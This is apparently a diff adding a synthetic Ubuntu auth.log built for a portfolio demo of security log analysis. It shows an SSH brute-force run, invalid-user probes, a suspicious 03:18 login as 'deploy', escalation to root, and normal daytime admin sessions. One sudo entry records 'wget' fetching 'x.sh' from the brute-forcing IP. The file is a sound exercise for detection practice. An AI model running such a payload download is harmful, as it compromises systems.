@@ -1,0 +1,54 @@
+# Sample auth.log for portfolio demo (synthetic, not a real server).
+# Host: web01 (Ubuntu). IPs use documentation-only ranges (RFC 5737): 203.0.113.0/24, 198.51.100.0/24, 192.0.2.0/24.
+# Timezone: the server's clock, these timestamps and the owner's local time are all UTC. Owner's working hours: 09:00-18:00.
+# Built to show: brute force, invalid users, a failed->success sequence, and sudo activity. Lines are in chronological order.
+Oct 25 03:02:17 web01 sshd[2410]: Failed password for root from 203.0.113.45 port 40122 ssh2
+Oct 25 03:02:19 web01 sshd[2410]: Failed password for root from 203.0.113.45 port 40122 ssh2
+Oct 25 03:02:21 web01 sshd[2410]: Failed password for root from 203.0.113.45 port 40122 ssh2
+Oct 25 03:02:24 web01 sshd[2412]: Invalid user admin from 203.0.113.45 port 40130
+Oct 25 03:02:24 web01 sshd[2412]: Failed password for invalid user admin from 203.0.113.45 port 40130 ssh2
+Oct 25 03:02:27 web01 sshd[2414]: Invalid user test from 203.0.113.45 port 40138
+Oct 25 03:02:27 web01 sshd[2414]: Failed password for invalid user test from 203.0.113.45 port 40138 ssh2
+Oct 25 03:02:30 web01 sshd[2416]: Invalid user oracle from 203.0.113.45 port 40146
+Oct 25 03:02:30 web01 sshd[2416]: Failed password for invalid user oracle from 203.0.113.45 port 40146 ssh2
+Oct 25 03:02:33 web01 sshd[2418]: Invalid user postgres from 203.0.113.45 port 40154
+Oct 25 03:02:33 web01 sshd[2418]: Failed password for invalid user postgres from 203.0.113.45 port 40154 ssh2
+Oct 25 03:02:36 web01 sshd[2420]: Invalid user ubuntu from 203.0.113.45 port 40162
+Oct 25 03:02:36 web01 sshd[2420]: Failed password for invalid user ubuntu from 203.0.113.45 port 40162 ssh2
+Oct 25 03:02:39 web01 sshd[2422]: Invalid user git from 203.0.113.45 port 40170
+Oct 25 03:02:39 web01 sshd[2422]: Failed password for invalid user git from 203.0.113.45 port 40170 ssh2
+Oct 25 03:02:42 web01 sshd[2424]: Invalid user jenkins from 203.0.113.45 port 40178
+Oct 25 03:02:42 web01 sshd[2424]: Failed password for invalid user jenkins from 203.0.113.45 port 40178 ssh2
+Oct 25 03:02:45 web01 sshd[2426]: Failed password for root from 203.0.113.45 port 40186 ssh2
+Oct 25 03:02:48 web01 sshd[2426]: Failed password for root from 203.0.113.45 port 40186 ssh2
+Oct 25 03:02:51 web01 sshd[2428]: Invalid user tomcat from 203.0.113.45 port 40194
+Oct 25 03:02:51 web01 sshd[2428]: Failed password for invalid user tomcat from 203.0.113.45 port 40194 ssh2
+Oct 25 03:02:54 web01 sshd[2430]: Invalid user www-data from 203.0.113.45 port 40202
+Oct 25 03:02:54 web01 sshd[2430]: Failed password for invalid user www-data from 203.0.113.45 port 40202 ssh2
+Oct 25 03:02:57 web01 sshd[2432]: Invalid user mysql from 203.0.113.45 port 40210
+Oct 25 03:02:57 web01 sshd[2432]: Failed password for invalid user mysql from 203.0.113.45 port 40210 ssh2
+Oct 25 03:03:00 web01 sshd[2434]: Invalid user ftpuser from 203.0.113.45 port 40218
+Oct 25 03:03:00 web01 sshd[2434]: Failed password for invalid user ftpuser from 203.0.113.45 port 40218 ssh2
+Oct 25 03:03:03 web01 sshd[2436]: Failed password for root from 203.0.113.45 port 40226 ssh2
+Oct 25 03:03:06 web01 sshd[2436]: Failed password for root from 203.0.113.45 port 40226 ssh2
+Oct 25 03:03:09 web01 sshd[2438]: Invalid user administrator from 203.0.113.45 port 40234
+Oct 25 03:03:09 web01 sshd[2438]: Failed password for invalid user administrator from 203.0.113.45 port 40234 ssh2
+Oct 25 03:17:44 web01 sshd[2501]: Failed password for deploy from 198.51.100.20 port 52880 ssh2
+Oct 25 03:17:48 web01 sshd[2501]: Failed password for deploy from 198.51.100.20 port 52880 ssh2
+Oct 25 03:17:52 web01 sshd[2501]: Failed password for deploy from 198.51.100.20 port 52880 ssh2
+Oct 25 03:18:05 web01 sshd[2503]: Accepted password for deploy from 198.51.100.20 port 52894 ssh2
+Oct 25 03:18:05 web01 sshd[2503]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Oct 25 03:18:41 web01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/su -
+Oct 25 03:18:41 web01 sudo: pam_unix(sudo:session): session opened for user root by deploy(uid=1002)
+Oct 25 03:19:30 web01 sudo:   deploy : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.45/x.sh
+Oct 25 03:20:14 web01 sshd[2503]: pam_unix(sshd:session): session closed for user deploy
+Oct 25 09:14:02 web01 sshd[1811]: Accepted publickey for admin from 192.0.2.10 port 51122 ssh2: RSA SHA256:ab12cd
+Oct 25 09:14:02 web01 sshd[1811]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Oct 25 09:30:12 web01 sshd[1811]: pam_unix(sshd:session): session closed for user admin
+Oct 25 09:41:55 web01 sshd[1890]: Accepted publickey for admin from 192.0.2.10 port 51140 ssh2: RSA SHA256:ab12cd
+Oct 25 09:41:55 web01 sshd[1890]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Oct 25 09:41:56 web01 sudo:    admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 25 10:03:11 web01 sshd[1890]: pam_unix(sshd:session): session closed for user admin
+Oct 25 11:22:09 web01 sshd[3120]: Accepted publickey for admin from 192.0.2.10 port 51320 ssh2: RSA SHA256:ab12cd
+Oct 25 11:22:09 web01 sshd[3120]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Oct 25 11:45:33 web01 sshd[3120]: pam_unix(sshd:session): session closed for user admin
